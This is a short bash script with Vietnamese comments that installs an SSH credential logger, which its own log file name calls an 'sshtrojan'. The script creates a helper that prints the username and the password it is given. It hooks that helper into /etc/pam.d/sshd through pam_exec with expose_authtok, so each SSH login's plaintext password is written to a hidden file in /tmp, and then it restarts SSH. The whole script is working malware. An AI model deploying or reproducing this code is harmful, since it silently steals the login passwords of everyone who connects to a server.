#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"

if [[ -f $file_log ]]; then		#kiểm tra tệp tin log đã tồn tại hay chưa
    echo "File $file_log exits"
else        					#nếu chưa có thì tạo bằng lệnh touch
    echo "Create File $file_log"
    touch $file_log
fi

file_exec="/root/sshlogger.sh"
cat > $file_exec << EOF 		# ghi đè nội dung vào file
#!/bin/bash
read password				# đọc mật khẩu
printf "Username: \$PAM_USER\nPassword: \$password\n"	#PAM_USER: đọc tên người dùng
EOF
chmod +x $file_exec

file_sshd="/etc/pam.d/sshd"
echo "Run File"
cat >> $file_sshd << EOF
auth optional pam_exec.so expose_authtok log=$file_log $file_exec	#dùng module auth kết nối với expose_authtok để chạy file_exec đọc password từ input, sau đó kết quả lưu vào file_log 
EOF
echo "Restart SSH"
/etc/init.d/ssh restart